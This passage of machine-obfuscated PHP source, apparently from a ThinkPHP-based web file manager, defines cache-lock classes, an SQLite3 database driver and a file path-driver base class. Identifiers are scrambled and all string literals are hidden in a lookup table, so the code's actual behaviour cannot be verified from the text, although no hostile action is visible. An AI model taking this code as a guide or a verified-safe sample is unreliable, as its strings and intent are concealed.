$ÅÄÜĞÍ[$¾å¬éº[923]] : 10; $×‘„¢Â = _get($GLOBALS[$¾å¬éº[6]], $¾å¬éº[924]); $ğÕ€î“î = $ÅÄÜĞÍ[$¾å¬éº[909]] ? $ÅÄÜĞÍ[$¾å¬éº[909]] : $¾å¬éº[242]; if ($ğÕ€î“î == $¾å¬éº[21] && $×‘„¢Â == $¾å¬éº[13]) { $ğÕ€î“î = $¾å¬éº[242]; } switch ($ğÕ€î“î) { case $¾å¬éº[912]: self::$handle = new CacheLockRedis(); break; case $¾å¬éº[913]: self::$handle = new CacheLockMemcached(); break; case $¾å¬éº[21]: self::$handle = new CacheLockDatabase(); break; case $¾å¬éº[242]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¾å¬éº[925], $¾å¬éº[926]); } return self::$handle; } private static function key($é˜¹ü“Õ) { return $_SERVER[¼èá¯æÙ][927] . Cache::key($é˜¹ü“Õ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($…¿İÈ©ö = '') { self::$errorMsg = $…¿İÈ©ö; } public static function lockGlobal($Æéş§ğ, $Ïµ’¿Øœ) { return self::lock($Æéş§ğ, $Ïµ’¿Øœ, !0); } public static function lock($ÇëçîÎ÷, $·¨â¤¯ = false, $ïßÒ—ş = false) { $ŒúöïÕü =& $_SERVER[¼èá¯æÙ]; $ªŸ¤î«¶ = self::init(); $Á³èÚ¯ö = self::key($ÇëçîÎ÷); $·¨â¤¯ = $·¨â¤¯ ? $·¨â¤¯ : self::$timeout; $¤ñ‡Æ†Ğ = timeFloat(); if ($GLOBALS[$ŒúöïÕü[928]]) { if (!$ªŸ¤î«¶->lock($Á³èÚ¯ö, 0.2)) { die; } return !0; } $şãƒÇŒŸ = $ªŸ¤î«¶->lock($Á³èÚ¯ö, $·¨â¤¯); $æúİÑÚ° = timeFloat(); if (!$şãƒÇŒŸ) { $æã…ø¢¹ = "\154\157\x63\x6b\40\145\x72\162\157\x72\x3b\153\145\x79\x3d{$ÇëçîÎ÷}\x3b\164\x69\x6d\x65\x3d{$·¨â¤¯}\73" . self::$errorMsg . $ŒúöïÕü[84] . get_caller_msg(); $´ªÔ¯‘É = LNG($ŒúöïÕü[929]) . "\50{$·¨â¤¯}\163\51\56" . LNG($ŒúöïÕü[930]); $´ªÔ¯‘É .= $ŒúöïÕü[931]; if (is_string(self::$errorMsg) && self::$errorMsg) { $´ªÔ¯‘É = $´ªÔ¯‘É . $ŒúöïÕü[932] . self::$errorMsg; } write_log($ŒúöïÕü[933] . sprintf($ŒúöïÕü[934], timeFloat() - $¤ñ‡Æ†Ğ) . $ŒúöïÕü[935] . $æã…ø¢¹ . $ŒúöïÕü[936] . json_encode(error_get_last()), $ŒúöïÕü[926]); show_json($´ªÔ¯‘É, !1); } if (!$ïßÒ—ş) { self::$lockItem[$Á³èÚ¯ö] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $íÎßˆ±À = number_format(timeFloat() - $æúİÑÚ°, 3); write_log($ŒúöïÕü[937] . $ÇëçîÎ÷ . $ŒúöïÕü[938] . $íÎßˆ±À, $ŒúöïÕü[926]); } return $şãƒÇŒŸ; } public static function lockGet($¬ˆéŠ–÷) { $áîÈ£‰Ì = self::key($¬ˆéŠ–÷); if (self::$lockItem[$áîÈ£‰Ì]) { return self::$lockItem[$áîÈ£‰Ì]; } return self::init()->lockGet($áîÈ£‰Ì); } public static function unlock($‡¦Ş‹Âç) { $ÏÃ—ó¤Ã =& $_SERVER[¼èá¯æÙ]; $í‰ø±ß• = self::key($‡¦Ş‹Âç); self::$lockItem[$í‰ø±ß•] = null; self::init()->unlock($í‰ø±ß•); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÏÃ—ó¤Ã[939] . $‡¦Ş‹Âç, $ÏÃ—ó¤Ã[926]); } return; } public static function unlockRuntime() { $òí¹”—é =& $_SERVER[¼èá¯æÙ]; $îºĞ½‚³ = self::init(); $Ì±ğİµ = !1; foreach (self::$lockItem as $ÁáÙƒãÆ => $ÏÃêĞáù) { if (!$ÏÃêĞáù) { continue; } $îºĞ½‚³->unlock($ÁáÙƒãÆ); if (!$Ì±ğİµ) { $Ì±ğİµ = !0; write_log($òí¹”—é[940] . $ÁáÙƒãÆ . $òí¹”—é[84] . get_caller_msg(), $òí¹”—é[926]); continue; } write_log($òí¹”—é[940] . $ÁáÙƒãÆ, $òí¹”—é[926]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $¹„ù¤ì = number_format(timeFloat() - TIME_FLOAT, 3); write_log($òí¹”—é[941] . $¹„ù¤ì . $òí¹”—é[942] . ACTION, $òí¹”—é[926]); } } public static function fileLock($şœ”³ÇÛ) { $ÔÄŒ²¼Ë =& $_SERVER[¼èá¯æÙ]; if (!$GLOBALS[$ÔÄŒ²¼Ë[943]]) { $GLOBALS[$ÔÄŒ²¼Ë[943]] = array(); } $GLOBALS[$ÔÄŒ²¼Ë[943]][$şœ”³ÇÛ] = !1; $ª×–Ş = fopen(DATA_PATH . $şœ”³ÇÛ . $ÔÄŒ²¼Ë[944], $ÔÄŒ²¼Ë[945]); if (!$ª×–Ş) { return !1; } $GLOBALS[$ÔÄŒ²¼Ë[943]][$şœ”³ÇÛ] = $ª×–Ş; if (flock($ª×–Ş, LOCK_EX)) { return !0; } self::unlock($şœ”³ÇÛ); show_json($ÔÄŒ²¼Ë[946], !1); return !1; } public static function fileUnlock($³‘€¶²·) { $Î¹†æ­Ñ =& $_SERVER[¼èá¯æÙ]; $œö–Ş‘¬ = $GLOBALS[$Î¹†æ­Ñ[943]][$³‘€¶²·]; if (!$œö–Ş‘¬) { return; } $GLOBALS[$Î¹†æ­Ñ[943]][$³‘€¶²·] = !1; flock($œö–Ş‘¬, LOCK_UN); fclose($œö–Ş‘¬); } public static function fileUnlockAll() { $‹­ä¾òÔ =& $_SERVER[¼èá¯æÙ]; if (!isset($GLOBALS[$‹­ä¾òÔ[943]]) || !$GLOBALS[$‹­ä¾òÔ[943]]) { return; } foreach ($GLOBALS[$‹­ä¾òÔ[943]] as $ª‚Æ—ş° => $¯‘Ô°”µ) { if (!$¯‘Ô°”µ) { continue; } $GLOBALS[$‹­ä¾òÔ[943]][$ª‚Æ—ş°] = !1; flock($¯‘Ô°”µ, LOCK_UN); fclose($¯‘Ô°”µ); } $GLOBALS[$‹­ä¾òÔ[943]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ªÆ½£é» =& $_SERVER[¼èá¯æÙ]; $Ã³ºÃ¾ = $GLOBALS[$ªÆ½£é»[6]][$ªÆ½£é»[436]]; self::$cachePath = $Ã³ºÃ¾[$ªÆ½£é»[242]][$ªÆ½£é»[97]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($±çÔÏôÆ, $Á ›ÊÛş = 0) { $—æ× ç =& $_SERVER[¼èá¯æÙ]; $Üİ¡ = microtime(!0); $İ‡­ĞŒ• = $Üİ¡ + $Á ›ÊÛş + 0.0001; $İ‡é¯Š¿ = rtrim(self::$cachePath, $—æ× ç[8]) . $—æ× ç[947] . md5($±çÔÏôÆ) . $—æ× ç[944]; if (file_exists($İ‡é¯Š¿) && filemtime($İ‡é¯Š¿) && filemtime($İ‡é¯Š¿) < time() - 10) { @unlink($İ‡é¯Š¿); } do { if (file_exists($İ‡é¯Š¿)) { cacheLockWait(); continue; } $Ğ¡’™Àâ = fopen($İ‡é¯Š¿, $—æ× ç[948]); if (!$Ğ¡’™Àâ) { return !1; } $ûô—º” = flock($Ğ¡’™Àâ, LOCK_EX | LOCK_NB); self::$caches[$±çÔÏôÆ] = array($—æ× ç[949] => $Ğ¡’™Àâ, $—æ× ç[242] => $İ‡é¯Š¿); fwrite($Ğ¡’™Àâ, $İ‡­ĞŒ•); clearstatcache(); if ($Ğ¡’™Àâ && $ûô—º”) { return !0; } cacheLockWait(); } while (microtime(!0) < $İ‡­ĞŒ•); $this->unlock($±çÔÏôÆ); return !1; } public function lockGet($áÒÏÉ“) { $âã†òÉİ =& $_SERVER[¼èá¯æÙ]; $ĞÒŸÆØµ = rtrim(self::$cachePath, $âã†òÉİ[8]) . $âã†òÉİ[947] . md5($áÒÏÉ“) . $âã†òÉİ[944]; return file_exists($ĞÒŸÆØµ); } public function unlock($ÄüÖåä) { $§¢ø°Å =& $_SERVER[¼èá¯æÙ]; $î–Îú¹º = self::$caches[$ÄüÖåä]; if (!$î–Îú¹º) { return; } @flock($î–Îú¹º[$§¢ø°Å[949]], LOCK_UN); @fclose($î–Îú¹º[$§¢ø°Å[949]]); @unlink($î–Îú¹º[$§¢ø°Å[242]]); unset(self::$caches[$ÄüÖåä]); } } goto Fç‘Œ’Ğ›Ø; Cèø®èŠŞÂ: class DbSqlite3Base extends Db { public function __construct($ŸßË«ì = '') { $Ó‰îˆíú =& $_SERVER[¼èá¯æÙ]; if (!class_exists($Ó‰îˆíú[64])) { think_exception(think_lang($Ó‰îˆíú[14]) . $Ó‰îˆíú[65]); } if (!empty($ŸßË«ì)) { if (!isset($ŸßË«ì[$Ó‰îˆíú[16]])) { $ŸßË«ì[$Ó‰îˆíú[16]] = 438; } $this->config = $ŸßË«ì; if (empty($this->config[$Ó‰îˆíú[17]])) { $this->config[$Ó‰îˆíú[17]] = array(); } } } public function connect($Àº ü¹ö = '', $‰ö´ÍÍ“ = 0) { $Æ…ê‡Š¥ =& $_SERVER[¼èá¯æÙ]; if (!isset($this->linkID[$‰ö´ÍÍ“])) { if (empty($Àº ü¹ö)) { $Àº ü¹ö = $this->config; } $this->linkID[$‰ö´ÍÍ“] = new SQLite3($Àº ü¹ö[$Æ…ê‡Š¥[21]]); if (!$this->linkID[$‰ö´ÍÍ“]) { think_exception($this->linkID[$‰ö´ÍÍ“]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$‰ö´ÍÍ“]->busyTimeout(30000); if (1 != think_config($Æ…ê‡Š¥[22])) { unset($this->config); } } return $this->linkID[$‰ö´ÍÍ“]; } public function free() { $this->queryID = null; } public function query($ƒÃĞœš) { $å¶¸üìœ =& $_SERVER[¼èá¯æÙ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ƒÃĞœš; if ($this->queryID) { $this->free(); } think_action_status($å¶¸üìœ[23], 1); think_status($å¶¸üìœ[24]); $this->queryID = $this->_linkID->query($ƒÃĞœš); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¯ìğ¸üı = $this->getAll(); $this->numRows = count($¯ìğ¸üı); return $¯ìğ¸üı; } } public function execute($²Å«‚öÙ) { $¼àÃâ€­ =& $_SERVER[¼èá¯æÙ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $²Å«‚öÙ; if ($this->queryID) { $this->free(); } think_action_status($¼àÃâ€­[25], 1); think_status($¼àÃâ€­[24]); $ÀêòßËÏ = $this->_linkID->exec($²Å«‚öÙ); $this->debug(); if (!1 === $ÀêòßËÏ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¼èá¯æÙ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $åƒìé£û = $this->_linkID->query($_SERVER[¼èá¯æÙ][27]); if (!$åƒìé£û) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¥—­ú² = $this->_linkID->query($_SERVER[¼èá¯æÙ][28]); if (!$¥—­ú²) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $£Áú„– = array(); while ($ˆñÏş = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $£Áú„–[] = $ˆñÏş; } $this->queryID->reset(); return $£Áú„–; } public function getFields($î„·¡¢¹) { $ôó¼¶ =& $_SERVER[¼èá¯æÙ]; $¢ãûÊ˜Œ = $this->query($ôó¼¶[29] . $î„·¡¢¹ . $ôó¼¶[30]); $É¯ûÃ† = array(); if ($¢ãûÊ˜Œ) { foreach ($¢ãûÊ˜Œ as $ª©™òÄ§ => $é±¡õíÖ) { $É¯ûÃ†[$é±¡õíÖ[$ôó¼¶[32]]] = array($ôó¼¶[32] => $é±¡õíÖ[$ôó¼¶[32]], $ôó¼¶[33] => $é±¡õíÖ[$ôó¼¶[33]], $ôó¼¶[35] => (bool) ($é±¡õíÖ[$ôó¼¶[35]] === $ôó¼¶[12]), $ôó¼¶[37] => $é±¡õíÖ[$ôó¼¶[66]], $ôó¼¶[39] => (bool) $é±¡õíÖ[$ôó¼¶[67]], $ôó¼¶[42] => (bool) $é±¡õíÖ[$ôó¼¶[67]]); } } return $É¯ûÃ†; } public function getTables($ïı‹ã±à = '') { $á”¿ËÁÆ =& $_SERVER[¼èá¯æÙ]; $Õ¡Õ „’ = $this->query($á”¿ËÁÆ[45] . $á”¿ËÁÆ[46] . $á”¿ËÁÆ[47]); $òë©âä = array(); foreach ($Õ¡Õ „’ as $™Şú¸ú => $å¢¡»ĞŒ) { $òë©âä[$™Şú¸ú] = current($å¢¡»ĞŒ); } return $òë©âä; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¿µ¬“÷ =& $_SERVER[¼èá¯æÙ]; $this->error = $this->_linkID->lastErrorMsg(); if ($¿µ¬“÷[12] != $this->queryStr) { $this->error .= LNG($¿µ¬“÷[48]) . $this->queryStr; } think_trace($this->error, $¿µ¬“÷[12], $¿µ¬“÷[49]); return $this->error; } public function escapeString($§·öõµ) { $ì ÁÉåœ =& $_SERVER[¼èá¯æÙ]; if ($this->_linkID) { return $this->_linkID->escapeString($§·öõµ); } return str_ireplace($ì ÁÉåœ[68], $ì ÁÉåœ[69], $§·öõµ); } public function parseLimit($œËıĞíĞ) { $ï„˜ãªç =& $_SERVER[¼èá¯æÙ]; $¤„Àœ»Ì = $ï„˜ãªç[12]; if (!empty($œËıĞíĞ)) { $œËıĞíĞ = explode($ï„˜ãªç[50], $œËıĞíĞ); if (count($œËıĞíĞ) > 1) { $¤„Àœ»Ì .= $ï„˜ãªç[51] . $œËıĞíĞ[1] . $ï„˜ãªç[52] . $œËıĞíĞ[0] . $ï„˜ãªç[53]; } else { $¤„Àœ»Ì .= $ï„˜ãªç[51] . $œËıĞíĞ[0] . $ï„˜ãªç[53]; } } return $¤„Àœ»Ì; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $£èÓ¦ÚÀ =& $_SERVER[¼èá¯æÙ]; $this->objectDriver = array($£èÓ¦ÚÀ[70], $£èÓ¦ÚÀ[71], $£èÓ¦ÚÀ[72], $£èÓ¦ÚÀ[73], $£èÓ¦ÚÀ[74], $£èÓ¦ÚÀ[75], $£èÓ¦ÚÀ[76], $£èÓ¦ÚÀ[77], $£èÓ¦ÚÀ[78], $£èÓ¦ÚÀ[79], $£èÓ¦ÚÀ[80], $£èÓ¦ÚÀ[81]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ÛÁÏåÎ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ÛÁÏåÎ, $_SERVER[¼èá¯æÙ][8]); } return $ÛÁÏåÎ; } public function iconvApp($‹‚ÖŸã) { return $‹‚ÖŸã; } public function iconvSystem($ŠÙØıÆ©) { return $ŠÙØıÆ©; } public function iconvTo($–ø’€‚, $–ÊÏ¥ïÄ, $‹¾†‚·‡) { $½­ù¼ç =& $_SERVER[¼èá¯æÙ]; if (!$–ø’€‚ || !function_exists($½­ù¼ç[82])) { return $–ø’€‚; } static $íç»Å©Ä = array(); $õ°Š¹ = $–ÊÏ¥ïÄ . $½­ù¼ç[83] . $‹¾†‚·‡ . $½­ù¼ç[84] . $–ø’€‚; if (isset($íç»Å©Ä[$õ°Š¹])) { return $íç»Å©Ä[$õ°Š¹]; } if (function_exists($½­ù¼ç[85])) { $•÷¥Ï÷ = @mb_convert_encoding($–ø’€‚, $‹¾†‚·‡, $–ÊÏ¥ïÄ); } else { $•÷¥Ï÷ = @iconv($–ÊÏ¥ïÄ, $‹¾†‚·‡, $–ø’€‚); } $•÷¥Ï÷ = $•÷¥Ï÷ ? $•÷¥Ï÷ : $–ø’€‚; if (strstr($•÷¥Ï÷, $½­ù¼ç[86])) { $•÷¥Ï÷ = str_replace($½­ù¼ç[86], $½­ù¼ç[11], $•÷¥Ï÷); } $íç»Å©Ä[$–ÊÏ¥ïÄ . $½­ù¼ç[83] . $‹¾†‚·‡ . $½­ù¼ç[84] . $–ø’€‚] = $•÷¥Ï÷; $íç»Å©Ä[$‹¾†‚·‡ . $½­ù¼ç[83] . $–ÊÏ¥ïÄ . $½­ù¼ç[84] . $–ø’€‚] = $–ø’€‚; $íç»Å©Ä[$‹¾†‚·‡ . $½­ù¼ç[83] . $–ÊÏ¥ïÄ . $½­ù¼ç[84] . $•÷¥Ï÷] = $–ø’€‚; $íç»Å©Ä[$–ÊÏ¥ïÄ . $½­ù¼ç[83] . $‹¾†‚·‡ . $½­ù¼ç[84] . $•÷¥Ï÷] = $•÷¥Ï÷; return $•÷¥Ï÷; } public function getPathInner($¯ÍÇÚ¨) { $Ô»ÏÇå’ = IO::init($¯ÍÇÚ¨); return $Ô»ÏÇå’->path; } public function getPathOuter($´¢„Öß) { $ã‰Šå¸ =& $_SERVER[¼èá¯æÙ]; $·´ÔéîÀ = strlen(trim($this->pathBase, $ã‰Šå¸[8])); $´¢„Öß = substr(trim($´¢„Öß, $ã‰Šå¸[8]), $·´ÔéîÀ); return $this->pathDriver . $ã‰Šå¸[8] . ltrim($´¢„Öß, $ã‰Šå¸[8]); } public function isParentOf($¹Òä¶ä…, $àÓî‚ª§) { $Çİâ†»è =& $_SERVER[¼èá¯æÙ]; $¹Òä¶ä… = rtrim(strtolower($¹Òä¶ä…), $Çİâ†»è[8]) . $Çİâ†»è[8]; $àÓî‚ª§ = rtrim(strtolower($àÓî‚ª§), $Çİâ†»è[8]) . $Çİâ†»è[8]; $¼àóÖ›‡ = strpos($àÓî‚ª§, $¹Òä¶ä…) === 0; return $¼àóÖ›‡; } public function getType() { $¶½‡Šì½ =& $_SERVER[¼èá¯æÙ]; $ª¨Ğ¯ô® = str_replace($¶½‡Šì½[87], $¶½‡Šì½[12], get_class($this)); return strtolower($ª¨Ğ¯ô®); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Õµ½Òéª, $Ää˜¯‹) { $ğ¡½’§÷ =& $_SERVER[¼èá¯æÙ]; $ºÅ„‡¬ = rtrim($Õµ½Òéª, $ğ¡½’§÷[8]) . $ğ¡½’§÷[8] . $Ää˜¯‹; $§íÂ…´  = $this->exist($ºÅ„‡¬); return $§íÂ…´  ? $ºÅ„‡¬ : !1; } public function setModifyTime($´Š¸“, $Ÿ«ñ¨Ê¼ = '') { } public function renameObject($İ÷¾’‡¼, $ÍÅ¹È) { $îºéô£Í = $ÍÅ¹È; $İ÷¾’‡¼ = $this->getPathOuter($İ÷¾’‡¼); $ÍÅ¹È = $this->pathFather($İ÷¾’‡¼) . $ÍÅ¹È; $õ”â¼îæ = IO::copy($İ÷¾’‡¼, $this->pathFather($İ÷¾’‡¼), REPEAT_RENAME_FOLDER, $îºéô£Í); if ($õ”â¼îæ) { IO::remove($İ÷¾’‡¼); } return $õ”â¼îæ ? $ÍÅ¹È : !1; } public function tempFile($±š™‹ƒ = '', $”¾¢¾¼Û = '') { if (!$±š™‹ƒ) { $±š™‹ƒ = rand_string(15); } $ˆìÔè” = TEMP_FILES . rand_string(15) . $_SERVER[¼èá¯æÙ][8]; @mkdir($ˆìÔè”, DEFAULT_PERRMISSIONS, !0); $ŸàîÃ”µ = $ˆìÔè” . $±š™‹ƒ; @touch($ŸàîÃ”µ); if ($”¾¢¾¼Û) { file_put_contents($ŸàîÃ”µ, $”¾¢¾¼Û); } return $ŸàîÃ”µ; } public function tempFileRemve($®äí˜Ùè) { @unlink($®äí˜Ùè); @rmdir($this->pathFather($®äí˜Ùè)); } public function mkfile($¾…ìşğŠ, $ËÖú´²ğ = '', $Çúäï¾ = REPEAT_RENAME) { } public function mkdir($›ÍŠñû¬, $«ğã¨•õ = REPEAT_SKIP) { } public function delFile($ºš¤˜ÛÄ) { } public function delFolder($ˆ¥å–ùä) { } public function copyFile($Ùû§Û•, $ƒöµÜ²Æ) { } public function moveFile($Ù×ìŸ£¾, $ÁÒ¥–¸½) { } public function remove($ò¥´ù¼İ) { if ($this->isFile($ò¥´ù¼İ)) { return $this->delFile($ò¥´ù¼İ); } return $this->delFolder($ò¥´ù¼İ); } public function rename($æ­æÍ³æ, $´ÅÄÑéß) { } public function exist($—ß‘‰) { } public function findByHash($ÀıøË ğ = '', $ÛÛ·òÒ = '') { return !1; } public function isFile($ °¾Óğù) { } public function isFolder($Ø›ÌŸ¨µ) { } public function size($›Åû†¤¤) { } public function info($ŠÓ³ë¶š) { } public function infoSimple($¼ËÓºŸÉ) { return $this->info($¼ËÓºŸÉ); } public function infoAuth($„®Î¼´) { return $this->info($„®Î¼´); } public function infoFull($´†‰Œ¤) { return $this->info($´†‰Œ¤); } public function infoFullSimple($Ôª„ÃŠ) { return $this->info($Ôª„ÃŠ); } public function infoWithChildren($…Ó£Ù £) { $„²š™„§ =& $_SERVER[¼èá¯æÙ]; static $ıÄ¿ÒÓ¯ = array(); if (isset($ıÄ¿ÒÓ¯[$…Ó£Ù £])) { return $ıÄ¿ÒÓ¯[$…Ó£Ù £]; } $Õòæ‰¦¬ = $this->info($…Ó£Ù £); if ($Õòæ‰¦¬ && $Õòæ‰¦¬[$„²š™„§[33]] == $„²š™„§[88]) { $Î‡¼ı¹¥ = array($„²š™„§[89] => 0, $„²š™„§[90] => 0, $„²š™„§[91] => 0); $this->infoChildren($…Ó£Ù £, $Î‡¼ı¹¥); $Õòæ‰¦¬[$„²š™„§[89]] = $Î‡¼ı¹¥[$„²š™„§[89]]; $Õòæ‰¦¬[$„²š™„§[92]] = array($„²š™„§[93] => $Î‡¼ı¹¥[$„²š™„§[90]], $„²š™„§[94] => $Î‡¼ı¹¥[$„²š™„§[91]]); $ıÄ¿ÒÓ¯[$…Ó£Ù £] = $Õòæ‰¦¬; } return $Õòæ‰¦¬; } public function listPath($“‡ãÁ˜Ñ, $ƒø¨¬ú = false) { } public function has($”ŒÌ¡öÁ, $Ó°“Ñ™® = false, $â¼¡Ù… = false) { } public function canRead($¡Ü“ë²) { } public function canWrite($û®ê¼È¦) { } public function getContent($îÒ¹É½¯) { } public function setContent($Ì¡†Ø, $Â¸óÖ›Î = '') { } protected function infoChildren($ù¢òîİü, &$µßÎ·˜) { $ê ŒßÎÍ =& $_SERVER[¼èá¯æÙ]; check_abort_echo(); $çÖ¢ùöÃ = $this->listPath($ù¢òîİü, !0); $çÖ¢ùöÃ = array_merge($çÖ¢ùöÃ[$ê ŒßÎÍ[95]], $çÖ¢ùöÃ[$ê ŒßÎÍ[96]]); foreach ($çÖ¢ùöÃ as $—ÛĞæ¾) { if ($—ÛĞæ¾[$ê ŒßÎÍ[33]] == $ê ŒßÎÍ[88]) { $µßÎ·˜[$ê ŒßÎÍ[91]]++; $¨ôıâ¨ = $this->getPathInner($—ÛĞæ¾[$ê ŒßÎÍ[97]]); $this->infoChildren($¨ôıâ¨, $µßÎ·˜); } else { $µßÎ·˜[$ê ŒßÎÍ[90]]++; $µßÎ·˜[$ê ŒßÎÍ[89]] += $—ÛĞæ¾[$ê ŒßÎÍ[89]]; } } } public function fileSubstr($ùØéµ®¾, $‰Ñè²Æ, $ŒÊŸøì) { } public function listAll($îÇ–”ğô) { } public function listAllMake($ÙÑÕ©‚Â, &$é†ÀˆÅ¸) { $öÕÓå“Ì =& $_SERVER[¼èá¯æÙ]; check_abort_echo(); $Ü¸İç³¼ = $this->listPath($ÙÑÕ©‚Â, !0); if (!$Ü¸İç³¼) { return; } $‚³ €ò– = array_merge($Ü¸İç³¼[$öÕÓå“Ì[95]], $Ü¸İç³¼[$öÕÓå“Ì[96]]); foreach ($‚³ €ò– as $ç“ÛŒ¸˜) { $¹ÒÜó¯ = $ç“ÛŒ¸˜[$öÕÓå“Ì[33]] == $öÕÓå“Ì[88]; $¡Ù¹Šíµ = array($öÕÓå“Ì[97] => $ç“ÛŒ¸˜[$öÕÓå“Ì[97]], $öÕÓå“Ì[88] => $¹ÒÜó¯); if (isset($ç“ÛŒ¸˜[$öÕÓå“Ì[89]])) { $¡Ù¹Šíµ[$öÕÓå“Ì[89]] = $ç“ÛŒ¸˜[$öÕÓå“Ì[89]]; } if (isset($ç“ÛŒ¸˜[$öÕÓå“Ì[98]])) { $¡Ù¹Šíµ[$öÕÓå“Ì[98]] = $ç“ÛŒ¸˜[$öÕÓå“Ì[98]]; } if (!$¹ÒÜó¯) { $é†ÀˆÅ¸[] = $¡Ù¹Šíµ; continue; } $é†ÀˆÅ¸[] = $¡Ù¹Šíµ; $Å¾¤ÇÆ = $ç“ÛŒ¸˜[$öÕÓå“Ì[97]]; $üú€¡¡¬ = $this->pathDriver; if (substr($ç“ÛŒ¸˜[$öÕÓå“Ì[97]], 0, strlen($üú€¡¡¬)) == $üú€¡¡¬) { $Å¾¤ÇÆ = substr($Å¾¤ÇÆ, strlen($üú€¡¡¬)); } $this->listAllMake($Å¾¤ÇÆ, $é†ÀˆÅ¸); } } public function listAllSimple($õş¤¤åí, $™Ú“ Ù² = false) { $àî¡ÎÌ· = $this->listAll($õş¤¤åí); return $this->listAllSimpleMake($àî¡ÎÌ·, $this->getPathOuter($õş¤¤åí), $™Ú“ Ù²); } public function listAllSimpleMake($°Ì—Ê´Ô, $¸•õÌ±ª, $³Çœ—µÚ) { $¹¬Öšë =& $_SERVER[¼èá¯æÙ]; $Ø£©Å÷ = array(); $¸•õÌ±ª = rtrim(get_path_father($¸•õÌ±ª), $¹¬Öšë[8]) . $¹¬Öšë[8]; foreach ($°Ì—Ê´Ô as $İòµ¯£Ç) { $–Ø¥±× = array($¹¬Öšë[97] => $İòµ¯£Ç[$¹¬Öšë[97]], $¹¬Öšë[99] => $İòµ¯£Ç[$¹¬Öšë[97]], $¹¬Öšë[88] => $İòµ¯£Ç[$¹¬Öšë[88]]); if (isset($İòµ¯£Ç[$¹¬Öšë[89]]) && !$İòµ¯£Ç[$¹¬Öšë[88]]) { $–Ø¥±×[$¹¬Öšë[89]] = $İòµ¯£Ç[$¹¬Öšë[89]]; } if (isset($İòµ¯£Ç[$¹¬Öšë[98]])) { $–Ø¥±×[$¹¬Öšë[98]] = $İòµ¯£Ç[$¹¬Öšë[98]]; } if (is_array($İòµ¯£Ç[$¹¬Öšë[100]])) { $–Ø¥±×[$¹¬Öšë[99]] = $İòµ¯£Ç[$¹¬Öšë[100]][$¹¬Öšë[97]]; $–Ø¥±×[$¹¬Öšë[89]] = $İòµ¯£Ç[$¹¬Öšë[100]][$¹¬Öšë[89]]; $–Ø¥±×[$¹¬Öšë[98]] = $İòµ¯£Ç[$¹¬Öšë[100]][$¹¬Öšë[98]]; } else { if (substr($İòµ¯£Ç[$¹¬Öšë[97]], 0, strlen($¸•õÌ±ª)) == $¸•õÌ±ª) { $–Ø¥±×[$¹¬Öšë[97]] = substr($İòµ¯£Ç[$¹¬Öšë[97]], strlen($¸•õÌ±ª)); } } $î™†÷öË = $İòµ¯£Ç[$¹¬Öšë[88]] ? $¹¬Öšë[8] : $¹¬Öšë[12]; $–Ø¥±×[$¹¬Öšë[99]] = rtrim($–Ø¥±×[$¹¬Öšë[99]], $¹¬Öšë[8]) . $î™†÷öË; $–Ø¥±×[$¹¬Öšë[97]] = $¹¬Öšë[8] . trim($–Ø¥±×[$¹¬Öšë[97]], $¹¬Öšë[8]) . $î™†÷öË; if (!$³Çœ—µÚ) { $Ù‘ã¸Ù¿ = explode($¹¬Öšë[8], trim($–Ø¥±×[$¹¬Öšë[97]], $¹¬Öšë[8])); $–Ø¥±×[$¹¬Öšë[97]] = $¹¬Öšë[8] . implode($¹¬Öšë[8], array_slice($Ù‘ã¸Ù¿, 1)) . $î™†÷öË; } $Ø£©Å÷[] = $–Ø¥±×; } return array_sort_by($Ø£©Å÷, $¹¬Öšë[97]); } public function upload($…Ã„ÅÙ, $ÈƒÂ¡ÊÃ, $ëˆ±ÉÂà = false, $Ô£œ›Í = REPEAT_REPLACE) { } public function uploadFileByID($æ‹É¼Õ, $ßéı³º‘, $õéÉı¶«) { } public function uploadFileByPath($û³ƒÉ½ş, $ü–Úö×, $®Æ¾„“— = array()) { } public function isUploadServer() { $üÖ§ßí =& $_SERVER[¼èá¯æÙ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $üÖ§ßí[101]) { return !0; } return $GLOBALS[$üÖ§ßí[6]][$üÖ§ßí[102]][$üÖ§ßí[103]]; } public function isFileOutServer() { $Ä ¸¯‚º =& $_SERVER[¼èá¯æÙ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ä ¸¯‚º[101]) { return !0; } return $GLOBALS[$Ä ¸¯‚º[6]][$Ä ¸¯‚º[102]][$Ä ¸¯‚º[104]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($¥î¤§¼) { $¾›¦á€‹ =& $_SERVER[¼èá¯æÙ]; if (!$this->isCdnHost()) { return $¥î¤§¼; } return str_replace(trim(get_url_root($¥î¤§¼), $¾›¦á€‹[8]), 